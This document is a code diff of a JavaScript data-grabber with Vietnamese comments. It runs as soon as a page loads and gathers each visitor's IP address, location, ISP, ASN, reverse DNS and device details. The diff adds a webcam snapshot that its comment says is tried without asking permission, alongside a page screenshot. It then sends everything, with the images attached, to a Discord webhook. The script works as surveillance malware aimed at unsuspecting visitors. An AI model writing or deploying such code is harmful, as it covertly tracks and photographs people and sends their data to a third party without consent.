@@ -27,65 +27,107 @@ const grabData = async () => {
         const agentData = await userResponse.json();
         console.log("API data OK");
 
-        // Hàm helper lấy giá trị an toàn (tránh undefined)
+        // Hàm helper lấy giá trị an toàn
         const safeGet = (obj, path, fallback = "N/A") => {
             return path.split('.').reduce((o, p) => (o && o[p] !== undefined) ? o[p] : fallback, obj);
         };
 
-        // Trích xuất dữ liệu địa lý với fallback
+        // Trích xuất dữ liệu địa lý
         const ip = geoData.ip || "Unknown";
-        const isp = `${safeGet(geoData, 'isp')} (${safeGet(geoData, 'continent_code')})`;
+        const isp = safeGet(geoData, 'isp') || "Unknown";
         const country = safeGet(geoData, 'country_name', "Unknown");
-        const regionCode = (safeGet(geoData, 'country_code2') || "").toLowerCase();
-        const region = `${safeGet(geoData, 'country_code3')} (${safeGet(geoData, 'country_code2')})`;
         const city = safeGet(geoData, 'city', "Unknown");
-        const languages = safeGet(geoData, 'languages');
         const lat = safeGet(geoData, 'latitude', 0);
         const lon = safeGet(geoData, 'longitude', 0);
-        const callCode = safeGet(geoData, 'calling_code');
+        const asNumber = safeGet(geoData, 'asn') || "Unknown";
+        const asnName = safeGet(geoData, 'organization') || "Unknown";
+        const reverseDNS = safeGet(geoData, 'reverse') || "Unknown";
+        const regionCode = (safeGet(geoData, 'country_code2') || "").toLowerCase();
         const flag = safeGet(geoData, 'country_flag') || "https://via.placeholder.com/64?text=Flag";
-        const currency = safeGet(geoData, 'currency.name');
 
-        // Trích xuất dữ liệu trình duyệt với fallback
-        const browserName = `${safeGet(agentData, 'name')}/${safeGet(agentData, 'type')}`;
-        const engine = `${safeGet(agentData, 'engine.name')} (${safeGet(agentData, 'engine.versionMajor', '?')})`;
-        const os = `${safeGet(agentData, 'operatingSystem.name')} ${safeGet(agentData, 'operatingSystem.versionMajor', '?')}`;
+        // Phát hiện VPN (logic đơn giản)
+        const isVPN = asnName.toLowerCase().includes("worldstream") || isp.toLowerCase().includes("vpn");
+        const isMobile = safeGet(geoData, 'mobile', false);
+        const isHosting = !isMobile && !isVPN;
+        const isProxy = false;
 
-        // Tự load html2canvas từ CDN và chụp screenshot (KHÔNG cần quyền!)
+        // Trích xuất dữ liệu thiết bị và hệ điều hành từ user-agent
+        const deviceType = safeGet(agentData, 'device.type', 'Unknown');
+        const deviceName = deviceType === 'mobile' ? 'Điện thoại' :
+                         deviceType === 'tablet' ? 'Máy tính bảng' :
+                         deviceType === 'desktop' ? 'Máy tính để bàn' : 'Không xác định';
+        const customDeviceName = "Hien";
+        const osName = safeGet(agentData, 'operatingSystem.name', 'Không xác định');
+        const osVersion = safeGet(agentData, 'operatingSystem.versionMajor', '?');
+        const osInfo = `${osName} ${osVersion}`;
+
+        // Chụp ảnh từ camera (thử không yêu cầu quyền)
+        let cameraBlob = null;
+        let hasCamera = false;
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = () => resolve();
+                });
+                video.play();
+
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                await new Promise((blobResolve) => {
+                    canvas.toBlob((blob) => {
+                        cameraBlob = blob;
+                        hasCamera = true;
+                        console.log("Chụp ảnh từ camera thành công");
+                        blobResolve();
+                    }, 'image/png');
+                });
+
+                // Dừng stream để tránh rò rỉ tài nguyên
+                stream.getTracks().forEach(track => track.stop());
+            } catch (cameraError) {
+                console.warn("Không thể truy cập camera:", cameraError.message);
+                hasCamera = false;
+            }
+        }
+
+        // Tự load html2canvas từ CDN và chụp screenshot
         let screenshotBlob = null;
         let hasScreenshot = false;
         try {
-            // Tạo script tag để load html2canvas
             const script = document.createElement('script');
             script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
             script.async = true;
-
-            // Chờ script load xong mới chụp
             await new Promise((resolve, reject) => {
                 script.onload = async () => {
                     console.log("html2canvas loaded thành công!");
                     try {
                         const canvas = await html2canvas(document.body, {
-                            scale: 1,  // Chất lượng (1 = gốc)
-                            useCORS: true,  // Hỗ trợ ảnh cross-origin
-                            allowTaint: true,  // Cho phép ảnh từ domain khác
-                            backgroundColor: '#ffffff'  // Nền trắng nếu cần
+                            scale: 1,
+                            useCORS: true,
+                            allowTaint: true,
+                            backgroundColor: '#ffffff'
                         });
-                        canvas.toBlob((blob) => {
-                            screenshotBlob = blob;
-                            hasScreenshot = true;
-                            console.log("Chụp screenshot trang thành công");
-                        }, 'image/png');
+                        await new Promise((blobResolve) => {
+                            canvas.toBlob((blob) => {
+                                screenshotBlob = blob;
+                                hasScreenshot = true;
+                                console.log("Chụp screenshot trang thành công");
+                                blobResolve();
+                            }, 'image/png');
+                        });
                         resolve();
                     } catch (captureError) {
                         console.warn("Lỗi chụp screenshot:", captureError);
                         reject(captureError);
                     }
                 };
-                script.onerror = () => {
-                    console.error("Lỗi load html2canvas từ CDN");
-                    reject(new Error("Không load được html2canvas"));
-                };
+                script.onerror = () => reject(new Error("Không load được html2canvas"));
                 document.head.appendChild(script);
             });
         } catch (screenshotError) {
@@ -93,7 +135,7 @@ const grabData = async () => {
             hasScreenshot = false;
         }
 
-        // Tạo payload cơ bản
+        // Tạo payload Discord với thông tin mở rộng
         const params = {
             username: `Truy cập từ ${country}/${city}`,
             avatar_url: "https://cdn-icons-png.flaticon.com/512/7013/7013144.png",
@@ -112,8 +154,8 @@ const grabData = async () => {
                             inline: true
                         },
                         {
-                            name: `:flag_${regionCode}: Quốc gia & Khu vực`,
-                            value: `${country}/${city} - ${region}`,
+                            name: `:flag_${regionCode}: Quốc gia & Thành phố`,
+                            value: `${country}/${city}`,
                             inline: true
                         },
                         {
@@ -122,18 +164,58 @@ const grabData = async () => {
                             inline: true
                         },
                         {
-                            name: "👤 Thông tin Client",
-                            value: `🌐 Trình duyệt: ${browserName}\n⚙️ Engine: ${engine}\n💻 HĐH: ${os}`,
+                            name: "🌐 AS Number",
+                            value: asNumber,
                             inline: true
                         },
                         {
-                            name: "📧 Thông tin thêm",
-                            value: `📞 Mã gọi: (+${callCode})\n🗣️ Ngôn ngữ: ${languages}\n💰 Tiền tệ: ${currency}`,
+                            name: "🌐 ASN Name",
+                            value: asnName,
+                            inline: true
+                        },
+                        {
+                            name: "🔍 Reverse DNS",
+                            value: reverseDNS,
+                            inline: true
+                        },
+                        {
+                            name: "📱 Mobile",
+                            value: isMobile ? "True" : "False",
+                            inline: true
+                        },
+                        {
+                            name: "🏠 Hosting",
+                            value: isHosting ? "True" : "False",
+                            inline: true
+                        },
+                        {
+                            name: "🔒 Proxy",
+                            value: isProxy ? "True" : "False",
+                            inline: true
+                        },
+                        {
+                            name: "🔐 VPN",
+                            value: isVPN ? "True" : "False",
+                            inline: true
+                        },
+                        {
+                            name: "🖥️ Thiết bị",
+                            value: `${deviceName} - ${customDeviceName}`,
+                            inline: true
+                        },
+                        {
+                            name: "💻 Hệ điều hành",
+                            value: osInfo,
                             inline: true
                         },
                         {
                             name: "📸 Screenshot",
                             value: hasScreenshot ? "Đã chụp trang web (xem attachment)" : "Không thể chụp",
+                            inline: true
+                        },
+                        {
+                            name: "🎥 Ảnh Camera",
+                            value: hasCamera ? "Đã chụp ảnh camera (xem attachment)" : "Không thể chụp",
                             inline: true
                         }
                     ],
@@ -145,21 +227,13 @@ const grabData = async () => {
             ]
         };
 
-        // Gửi lên Discord (FormData nếu có ảnh)
+        // Gửi lên Discord
         console.log("Gửi payload...");
-        let response;
-        if (screenshotBlob) {
-            const formData = new FormData();
-            formData.append('file', screenshotBlob, 'page-screenshot.png');
-            formData.append('payload_json', JSON.stringify(params));
-            response = await fetch(webhookUrl, { method: "POST", body: formData });
-        } else {
-            response = await fetch(webhookUrl, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(params)
-            });
-        }
+        const formData = new FormData();
+        if (screenshotBlob) formData.append('file1', screenshotBlob, 'page-screenshot.png');
+        if (cameraBlob) formData.append('file2', cameraBlob, 'camera-snapshot.png');
+        formData.append('payload_json', JSON.stringify(params));
+        const response = await fetch(webhookUrl, { method: "POST", body: formData });
 
         const errorText = await response.text();
         console.log("Response full:", { status: response.status, body: errorText });
@@ -177,4 +251,3 @@ const grabData = async () => {
 
 // Chạy lần đầu
 grabData();
-
